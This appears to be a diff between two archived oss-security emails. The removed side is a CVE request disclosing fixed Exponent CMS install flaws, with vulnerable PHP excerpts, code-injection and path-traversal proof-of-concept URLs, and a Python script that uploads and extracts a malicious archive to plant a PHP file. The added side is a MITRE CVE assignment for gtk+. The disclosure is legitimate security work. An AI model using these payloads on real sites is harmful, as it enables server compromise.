@@ -1,139 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/22/6
-Message-ID: <CAEiFw0XGwYm+U74Fjs_UhZ3RvJhjN_uCV-kKb9zDcPsGhtk97A@mail.gmail.com>
-Date: Thu, 22 Sep 2016 21:35:46 +0800
-From: Carl Peng <felixk3y@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request - Exponent CMS 2.3.9 multi-vulnerabilities in install code
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/10/6
+Message-Id: <20160210202003.2D418B2E0D7@smtpvbsrv1.mitre.org>
+Date: Wed, 10 Feb 2016 15:20:03 -0500 (EST)
+From: cve-assign@...re.org
+To: seth.arnold@...onical.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, security@...ntu.com
+Subject: Re: CVE Request: eom, gnome-photos, eog, gambas3, thunar, pinpoint, gtk+2.0
 Content-Type: text/plain; charset=utf-8
 
-Hi , I reported the following vulnerabilities in the install code to the
-ExponentCMS team some days ago and fixed now.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-1. Arbitrary code execution
-https://github.com/exponentcms/exponent-cms/blob/master/install/index.php#L56-L63
-```
-lines 56 - 63
-if (isset($_REQUEST['sc'])) {
-    if (file_exists("../framework/conf/config.php")) {
-        // Update the config
-        foreach ($_REQUEST['sc'] as $key => $value) {
-//            $value = expString::sanitize($value);
-            expSettings::change($key, $value);
-        }
-    }
-```
-The function of the expSettings::change() is to modify the config
-file("framework/conf/config.php"), but there is failed to filter user input
-lead to we could write anything to config file.
+> https://bugzilla.gnome.org/show_bug.cgi?id=703220
+>> Reported: 2013-06-27 23:17 UTC by Bert Massop
+>> Memory allocation integer overflow in gdk_cairo_set_source_pixbuf on large pixbufs
 
-Proof of concept:
-http://www.exponentcms.org/install/index.php?sc[SMTP_PORT]=25\\');phpinfo();//
-  phpinfo() will be executed.
-Tips:
-Visit " http://www.exponentcms.org/install/index.php?sc[SMTP_PORT]=25 " can
-be recovery it.
+> https://bugs.launchpad.net/ubuntu/+source/gtk+2.0/+bug/1540811
+> https://github.com/mate-desktop/eom/issues/93
+> https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=799275
+> https://git.gnome.org/browse/gtk+/commit?id=894b1ae76a32720f4bb3d39cf460402e3ce331d6
 
+Use CVE-2013-7447.
 
-2. RCE vulnerability
-https://github.com/exponentcms/exponent-cms/blob/master/install/index.php#L47-L53
-```
-if (isset($_REQUEST['profile'])) {
-    expSettings::activateProfile($_REQUEST['profile']); //here
-    expTheme::removeSmartyCache(); //FIXME is this still necessary?
-    expSession::clearAllUsersSessionCache();
-    flash('message', gt("New Configuration Profile Loaded"));
-    header('Location: ../index.php');
-}
-```
-expSettings::activateProfile() :
-https://github.com/exponentcms/exponent-cms/blob/master/framework/core/subsystems/expSettings.php#L587-L593
-```
-copy(BASE . "framework/conf/profiles/$profile.php", BASE .
-"framework/conf/config.php"); //here
-// tag it with the profile name
-$fh = fopen(BASE . "framework/conf/config.php", "a");
-```
-We can upload a "php" file to website, then copy it to
-"framework/conf/config.php"
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-Proof of concept:
-first, We first upload a "php" to website (by “uploader_paste.php”), such
-as /files/test.php
-then visit
-http://www.exponentcms.org/install/index.php?profile=../../../files/test,
-then will copy "/files/test.php" to "framework/conf/config.php".
-
-
-3. File Upload vulnerability
-https://github.com/exponentcms/exponent-cms/blob/master/install/index.php#L77-L94
-```
-$files = BASE . "themes/" . DISPLAY_THEME_REAL . "/" .
-$_REQUEST['install_sample'] . ".tar.gz";
-if (!file_exists($files)) {
-    $files = BASE . "install/samples/" . $_REQUEST['install_sample'] .
-".tar.gz"; //here
-}
-if (file_exists($files)) { // only install if there was an archive
-    include_once(BASE . 'external/Tar.php');
-    $tar = new Archive_Tar($files); //Extract .tar.gz file
-    $return = $tar->extract(BASE);
-}
-```
-The function of those code is extract .tar.gz file, but through
-"install_sample", the parameter of "$files" is what we can control, so we
-could upload a .tar.gz evil file, then extract it.
-
-Proof of concept:
-first, upload .eql and .tar.gz files(by “uploader_paste.php”),such as
-/files/10.tar.gz
-then visit
-http://www.exponentcms.org/install/index.php?install_sample=../../files/10
-Successfully extract file:  http://www.exponentcms.org/3.php
-
-python poc code:
-```
-import random
-import requests
-host = 'http://www.exponentcms.org/'
-
-def upload(name, url):
-files = {'upload' : (name, open('evil.tar.gz'))}
-resp = requests.post(url, files=files)
-return resp.content
-
-if 'http://' not in host: host = 'http://{}'.format(host)
-
-host = host.rstrip('/')
-url = '{}/framework/modules/file/connector/uploader_paste.php'.format(host)
-rstr = random.randint(10,99)
-
-req_eql = upload('{}.eql'.format(rstr), url)
-req_tar = upload('{}.tar.gz'.format(rstr), url)
-
-if 'tar.gz' in req_tar:
-req_inc =
-requests.get('{}/install/index.php?install_sample=../../files/{}'.format(host,
-rstr))
-
-evilfile = '{}/3.php'.format(host)
-req_ = requests.get(evilfile)
-
-if 'GIF89a' in req_.content:
-print evil-file
-```
-
-And now, all vulnerabilities have been fixed.
-https://exponentcms.lighthouseapp.com/projects/61783/changesets/4ae457ff1bf80e8b61286cd125ca794b25564e86
-https://github.com/exponentcms/exponent-cms/commit/4ae457ff1bf80e8b61286cd125ca794b25564e86
-
-
-these issues was reported by Peng Hua of silence.com.cn Inc. and I would
-like
-to request  CVEs for these issues (if not done so).
-
-
--------------------http://www.silence.com.cn/
-penghua@...ence.com.cn
-PKAV Team
-
+iQIcBAEBCAAGBQJWu5rcAAoJEL54rhJi8gl5JEoQAJvhxa+JfBRfWSeMuAkMjHZ/
+e2Sl1CSTNy/bSbJ+vZFxgNDSah/QRCW3wteA/wPpOubufPPklbDav9tycaVop3Wb
+hA1W5RFdHyxt0mUmGdLJd23nnyZ16OanMhMeIUhnzz0z5gY+rITFs2d7twK+k5To
+BIpbEjF/LjFyuP809v3vmdjY5vOET9X5cE6Vf4h0ewo7jCYRjtTSeYSTzZK07fTI
+dChHQ1TS8iw9kHZE7/BfsOcfm3zyPVKdgAb8C0d73/byLZs+CNdiOli0jP0V8BkO
+2335Kh1PNZgyg3/Q/13lgzuQD46WPUlWv+bz12yXzO6GpVTxp9ff9yVX5x2LCwL4
+oMVQ0OohIW0o7sdwBxv4wembusboImoae0aV8ID24y8poRVGtTlCevZoLbp7d0zr
+lOiOJGopzy2lin4i10yUhkZb+V1aCKb8KTQJX0r8LrbQl0TvYSqv18t5jueMbeIB
+Qg2emOFVc45eStz/zJI+PV4ly8smKOcWPiJOp47xHb4SlgdC409xJaak1FoGgiVX
+PdXvp6Fh1v96DUG0WXb+MqKSsJSbMqrj/PNtYC7fzFPrezVcjG3WDVx+EcqVAMvh
+mRkq+OjbhYEm3D69ZgoMgkVbDrgqEwFKZLkNfnpvQKjvJeA8vlhJadfZ/iuHY8MC
+mQn7uQO0hFn4AwX4s53z
+=wp1h
+-----END PGP SIGNATURE-----
